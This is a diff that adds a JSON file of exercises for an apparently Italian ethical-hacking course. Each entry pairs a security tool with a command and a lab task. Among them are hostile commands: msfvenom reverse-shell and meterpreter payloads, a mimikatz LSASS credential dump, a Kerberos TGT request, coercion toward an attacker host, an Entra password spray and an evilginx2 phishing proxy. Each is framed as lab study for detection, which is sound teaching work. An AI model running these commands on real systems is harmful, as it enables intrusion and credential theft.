@@ -1,0 +1,625 @@
+{
+  "fixes": [
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "Maltego Transform",
+      "set": {
+        "command": "maltego",
+        "task": "Apri la suite di OSINT per mappare in lab la superficie pubblica di un dominio interno e ridurla."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Phishing Kit",
+      "set": {
+        "command": "git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && make",
+        "task": "Compila il framework in un lab isolato per studiare la struttura interna di un kit usato negli attacchi reali."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Evilginx",
+      "set": {
+        "command": "evilginx2 -p ./phishlets -developer",
+        "task": "Avvia il proxy in modalita di sviluppo nel lab interno per validare la difesa MFA contro reverse proxy."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "Gophish",
+      "set": {
+        "command": "./gophish",
+        "task": "Lancia il server di simulazione in un ambiente isolato per pianificare campagne di phishing autorizzate dal management."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "King Phisher",
+      "set": {
+        "command": "king-phisher-server -f config.yml",
+        "task": "Avvia il server di campagna nel lab per gestire training di awareness con tracking dei click sui finti link."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "Hunter.io",
+      "set": {
+        "command": "curl 'https://api.hunter.io/v2/domain-search?domain=example.com&api_key=KEY'",
+        "task": "Interroga l'API per scoprire quali email aziendali sono pubblicate online e proporne la rimozione."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "LinkedIn OSINT",
+      "set": {
+        "command": "linkedin2username -c company-name -o users.txt",
+        "task": "Genera la lista di possibili username dal profilo LinkedIn aziendale per allenare i filtri di brute force."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Exploit Module",
+      "set": {
+        "command": "use exploit/multi/handler",
+        "task": "Imposta un handler generico nel lab per ricevere shell di esercitazione e studiare la post-exploitation."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Post Module",
+      "set": {
+        "command": "use post/multi/recon/local_exploit_suggester",
+        "task": "Esegui il suggeritore in lab per individuare exploit locali noti e applicare le patch mancanti."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Armitage",
+      "set": {
+        "command": "armitage",
+        "task": "Apri la GUI di Metasploit in un lab didattico per visualizzare host, servizi e sessioni in un colpo d'occhio."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "Script Categories",
+      "set": {
+        "command": "nmap --script-help \"vuln and safe\"",
+        "task": "Consulta le categorie disponibili per scegliere solo script non distruttivi durante un assessment di produzione."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "Zenmap",
+      "set": {
+        "command": "zenmap",
+        "task": "Avvia la GUI di Nmap per visualizzare la topologia degli host scoperti nel lab e confrontare scansioni storiche."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "Nmap Output Parsing",
+      "set": {
+        "code": "from libnmap.parser import NmapParser\nreport = NmapParser.parse_fromfile('scan.xml')\nfor host in report.hosts:\n    print(host.address, host.services)",
+        "task": "Analizza l'XML di Nmap con Python per estrarre asset e servizi in un report ordinato per il SOC."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Wireshark",
+      "set": {
+        "command": "wireshark -r capture.pcap",
+        "task": "Apri un PCAP raccolto durante un incidente per ricostruire i flussi sospetti e classificare l'attivita'."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Caido",
+      "set": {
+        "command": "caido",
+        "task": "Avvia il proxy moderno in un lab di web testing per ispezionare le richieste di un'app prima del rilascio."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Aircrack-ng Suite",
+      "set": {
+        "command": "airmon-ng start wlan0",
+        "task": "Metti la scheda in monitor mode nel lab wireless dedicato per studiare i pacchetti di management 802.11."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Recon-ng Module",
+      "set": {
+        "command": "recon-ng -w engagement",
+        "task": "Carica un workspace nel framework OSINT per catalogare sottodomini esposti del tuo perimetro."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Empire",
+      "set": {
+        "command": "powershell-empire server",
+        "task": "Avvia il server del C2 educativo in lab per studiare come gli EDR aziendali rilevano agenti PowerShell."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Sliver",
+      "set": {
+        "command": "sliver-server",
+        "task": "Esegui il C2 di simulazione in lab per validare che le regole Sigma del SOC catturino il beaconing mTLS."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Havoc",
+      "set": {
+        "command": "havoc server --profile profile.yaotl",
+        "task": "Avvia il teamserver nel range lab per testare le detection EDR contro l'agente Demon configurato."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Mythic",
+      "set": {
+        "command": "sudo ./mythic-cli start",
+        "task": "Accendi la piattaforma multi-agente in un lab per esercitazioni purple team e tuning delle regole di detection."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Cobalt Strike",
+      "set": {
+        "command": "./teamserver 10.0.0.1 password",
+        "task": "Avvia il teamserver in un lab autorizzato per esercitazioni di adversary emulation contro il proprio SOC."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "PowerShell Empire",
+      "set": {
+        "command": "powershell-empire client",
+        "task": "Connetti il client al server del lab per studiare i moduli e progettare regole Sigma di detection."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "Mimikatz LSA Dump",
+      "set": {
+        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+        "task": "Studia in una VM Windows isolata come avviene il dump per costruire regole EDR mirate al furto LSASS."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "Kekeo",
+      "set": {
+        "command": "kekeo.exe \"tgt::ask /user:victim /domain:lab.local /password:pass\"",
+        "task": "Riproduci un flusso Kerberos in un lab AD didattico per capire come gli SPN possono essere abusati."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "SeatBelt",
+      "set": {
+        "command": "Seatbelt.exe -group=user",
+        "task": "Esegui il triage di sistema su una VM lab per inventariare configurazioni rischiose e correggerle."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "SharpUp",
+      "set": {
+        "command": "SharpUp.exe audit",
+        "task": "Analizza in una VM Windows lab i percorsi di privilege escalation per consolidare l'hardening prima del rilascio."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "BloodHound Attack Path Query",
+      "set": {
+        "command": "bloodhound --no-sandbox",
+        "task": "Apri l'interfaccia per visualizzare gli attack path in un dominio AD lab e ridurli con tiering rigoroso."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "ADRecon",
+      "set": {
+        "command": "Invoke-ADRecon -DomainController dc.lab.local",
+        "task": "Genera un report completo sul dominio lab per auditare account, GPO e trust durante un assessment interno."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "PingCastle",
+      "set": {
+        "command": "PingCastle.exe --healthcheck --server lab.local",
+        "task": "Lancia un health check del dominio lab per ottenere un punteggio di maturita' e priorita' di remediation."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "Coercion Attack",
+      "set": {
+        "command": "coercer coerce -t dc.lab.local -l attacker.lab.local",
+        "task": "Riproduci la coercion in un dominio lab per validare che SMB signing e patch PetitPotam siano attive."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "mitm6",
+      "set": {
+        "command": "mitm6 -d lab.local --no-ra",
+        "task": "Esegui il tool nel segmento lab isolato per dimostrare al team il rischio di IPv6 abilitato di default."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "Impacket Suite",
+      "set": {
+        "command": "pip install impacket",
+        "task": "Installa la suite Python nel lab per studiare protocolli SMB e Kerberos durante esercitazioni di red team."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "wmiexec.py",
+      "set": {
+        "command": "wmiexec.py lab.local/admin@10.0.0.5",
+        "task": "Connettiti via WMI a un host del dominio lab per testare le detection EDR su esecuzione remota."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "jadx",
+      "set": {
+        "command": "jadx-gui app.apk",
+        "task": "Apri un APK aziendale nel decompilatore per controllare che il codice non esponga endpoint di debug."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "Drozer",
+      "set": {
+        "command": "drozer console connect",
+        "task": "Connettiti all'agente sull'emulatore lab per enumerare activity esportate e content provider vulnerabili."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "Android Emulator",
+      "set": {
+        "command": "emulator -avd Pixel_API_30 -writable-system",
+        "task": "Avvia un emulatore con partizione scrivibile per installare un CA aziendale e ispezionare il traffico TLS."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "class-dump",
+      "set": {
+        "command": "class-dump -H AppBinary -o headers/",
+        "task": "Estrai gli header Objective-C da un binario decifrato nel lab per pianificare gli hook di analisi."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "Keychain",
+      "set": {
+        "command": "keychain_dumper > keychain.txt",
+        "task": "Esporta i segreti dal Keychain di un device jailbroken di test per misurare cosa l'app espone localmente."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "MobSF",
+      "set": {
+        "command": "docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf",
+        "task": "Accendi il framework di analisi statica per scansionare gli APK aziendali prima della pubblicazione su Play."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_4",
+      "english": "iMobax",
+      "set": {
+        "command": "imobax --analyze app.ipa",
+        "task": "Mappa i deep link registrati di un'app iOS del lab per validare i controlli sulle URL handler."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_4",
+      "english": "reFlutter",
+      "set": {
+        "command": "reflutter app.apk",
+        "task": "Patcha un'APK Flutter del lab per abilitare il proxy HTTPS e validare le chiamate API in chiaro."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_1",
+      "english": "IAM Exploitation",
+      "set": {
+        "command": "pmapper --account-id 123456789012 graph create",
+        "task": "Costruisci il grafo IAM del tuo account AWS lab per scoprire percorsi di privilege escalation impliciti."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_1",
+      "english": "Pacu",
+      "set": {
+        "command": "pacu",
+        "task": "Apri il framework di pentest AWS in un account lab dedicato per esercitare la detection di GuardDuty."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_2",
+      "english": "AzureAD Spray",
+      "set": {
+        "command": "Invoke-MSOLSpray -UserList users.txt -Password Spring2024!",
+        "task": "Simula uno spray controllato sul tenant lab per validare le regole Conditional Access e il logging Entra."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_2",
+      "english": "AADInternals",
+      "set": {
+        "command": "Install-Module AADInternals -Scope CurrentUser",
+        "task": "Installa il modulo PowerShell nel lab per studiare gli abusi su Entra ID e affinare le regole Sentinel."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_2",
+      "english": "ROADtools",
+      "set": {
+        "command": "roadrecon auth -u admin@lab.onmicrosoft.com",
+        "task": "Dumpa la directory del tenant lab in Neo4j per visualizzare ruoli e applicazioni a rischio."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_2",
+      "english": "Azure Storage Enum",
+      "set": {
+        "command": "Invoke-EnumerateAzureBlobs -Base companyname",
+        "task": "Cerca container blob pubblici legati alla tua azienda per chiudere quelli che espongono dati sensibili."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_3",
+      "english": "Hardcoded Cloud Keys",
+      "set": {
+        "command": "trufflehog filesystem ./repo --only-verified",
+        "task": "Scansiona la history Git per trovare chiavi AWS e ruotarle prima di pubblicare il repository."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_3",
+      "english": "Subdomain Takeover",
+      "set": {
+        "command": "subjack -w domains.txt -t 50 -ssl -v -o results.txt",
+        "task": "Verifica i sottodomini aziendali per individuare DNS pendenti e prevenire takeover su servizi dismessi."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_4",
+      "english": "Kubernetes",
+      "set": {
+        "command": "kubectl get pods --all-namespaces",
+        "task": "Elenca i pod del cluster lab per confermare che workload sospetti non siano stati schedulati di nascosto."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_4",
+      "english": "kube-hunter",
+      "set": {
+        "command": "kube-hunter --remote 10.0.0.5",
+        "task": "Scansiona il cluster lab per scoprire endpoint kubelet non autenticati e chiuderli prima del go-live."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_4",
+      "english": "kubeaudit",
+      "set": {
+        "command": "kubeaudit all -f manifest.yaml",
+        "task": "Audita un manifest Kubernetes per individuare pod che girano come root o senza securityContext."
+      }
+    },
+    {
+      "level": "16",
+      "lesson": "ethack_cloud_hacking_4",
+      "english": "Peirates",
+      "set": {
+        "command": "peirates",
+        "task": "Lancia il tool dentro un pod lab per dimostrare al team le conseguenze di un service account sovra-privilegiato."
+      }
+    },
+    {
+      "level": "17",
+      "lesson": "ethack_malware_analysis_1",
+      "english": "FLOSS",
+      "set": {
+        "command": "floss sample.exe",
+        "task": "Estrai stringhe deoffuscate da un campione sospetto nel sandbox per arricchire gli IOC del SOC."
+      }
+    },
+    {
+      "level": "17",
+      "lesson": "ethack_malware_analysis_2",
+      "english": "Cuckoo Sandbox",
+      "set": {
+        "command": "cuckoo submit sample.exe",
+        "task": "Sottometti un campione in sandbox isolata per ottenere un report comportamentale completo e classificarlo."
+      }
+    },
+    {
+      "level": "17",
+      "lesson": "ethack_malware_analysis_2",
+      "english": "INetSim",
+      "set": {
+        "command": "inetsim --conf /etc/inetsim/inetsim.conf",
+        "task": "Accendi il simulatore di servizi di rete nel sandbox per osservare i tentativi di contatto del malware."
+      }
+    },
+    {
+      "level": "17",
+      "lesson": "ethack_malware_analysis_3",
+      "english": "Ghidra",
+      "set": {
+        "command": "ghidraRun",
+        "task": "Apri la suite NSA in un lab forense per fare reverse di un binario sospetto e generare detection mirate."
+      }
+    },
+    {
+      "level": "17",
+      "lesson": "ethack_malware_analysis_3",
+      "english": "angr",
+      "set": {
+        "code": "import angr\nproj = angr.Project('sample', auto_load_libs=False)\nstate = proj.factory.entry_state()\nsimgr = proj.factory.simulation_manager(state)\nsimgr.explore(find=0x400666)",
+        "task": "Esplora simbolicamente un binario in lab per scoprire input che colpiscono branch nascosti di un sample sospetto."
+      }
+    },
+    {
+      "level": "18",
+      "lesson": "ethack_exploit_dev_1",
+      "english": "Alphanumeric Shellcode",
+      "set": {
+        "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 -e x86/alpha_mixed -f raw",
+        "task": "Genera un payload alfanumerico in lab per studiare come gli exploit aggirano filtri che ammettono solo input stampabili."
+      }
+    },
+    {
+      "level": "18",
+      "lesson": "ethack_exploit_dev_1",
+      "english": "Polymorphic Encoding",
+      "set": {
+        "command": "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe",
+        "task": "Crea un payload polimorfico nel lab per capire come la mutazione di byte sfida le signature antivirus."
+      }
+    },
+    {
+      "level": "18",
+      "lesson": "ethack_exploit_dev_3",
+      "english": "AFL",
+      "set": {
+        "command": "afl-fuzz -i seeds -o output -- ./target @@",
+        "task": "Avvia una campagna di fuzzing su un parser interno per scoprire crash prima del rilascio in produzione."
+      }
+    },
+    {
+      "level": "18",
+      "lesson": "ethack_exploit_dev_3",
+      "english": "AFL++",
+      "set": {
+        "command": "afl-fuzz -i corpus -o findings -Q -- ./binary @@",
+        "task": "Fuzza con QEMU mode un binario chiuso del lab per individuare bug di parsing senza i sorgenti."
+      }
+    },
+    {
+      "level": "18",
+      "lesson": "ethack_exploit_dev_3",
+      "english": "libFuzzer",
+      "set": {
+        "code": "extern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    parse_input(data, size);\n    return 0;\n}",
+        "task": "Definisci un harness in-process per integrare il fuzzer nel CI e scoprire crash a ogni commit della libreria."
+      }
+    },
+    {
+      "level": "18",
+      "lesson": "ethack_exploit_dev_3",
+      "english": "Honggfuzz",
+      "set": {
+        "command": "honggfuzz -i corpus -- ./target ___FILE___",
+        "task": "Lancia il fuzzer in lab per usare il feedback hardware Intel PT e individuare bug con overhead minimo."
+      }
+    },
+    {
+      "level": "19",
+      "lesson": "ethack_red_team_4",
+      "english": "Atomic Red Team",
+      "set": {
+        "command": "Invoke-AtomicTest T1059.001",
+        "task": "Esegui il test atomico in lab per verificare che le regole di detection PowerShell del SOC scattino davvero."
+      }
+    },
+    {
+      "level": "19",
+      "lesson": "ethack_red_team_4",
+      "english": "CALDERA",
+      "set": {
+        "command": "python server.py --insecure",
+        "task": "Accendi il framework MITRE in lab per orchestrare adversary emulation e stressare EDR e SIEM aziendali."
+      }
+    },
+    {
+      "level": "19",
+      "lesson": "ethack_red_team_4",
+      "english": "Sigma Rule",
+      "set": {
+        "code": "title: Suspicious PowerShell Encoded Command\nlogsource:\n  product: windows\n  service: powershell\ndetection:\n  selection:\n    EventID: 4104\n    ScriptBlockText|contains: '-EncodedCommand'\n  condition: selection\nlevel: high",
+        "task": "Scrivi una regola portabile per rilevare PowerShell con comando codificato e distribuirla sul SIEM aziendale."
+      }
+    },
+    {
+      "level": "22",
+      "lesson": "ethack_ctf_labs_4",
+      "english": "VirtualBox",
+      "set": {
+        "command": "VBoxManage list vms",
+        "task": "Elenca le VM presenti sull'host lab per inventariare l'ambiente di pratica prima di accendere nuove macchine."
+      }
+    }
+  ]
+}
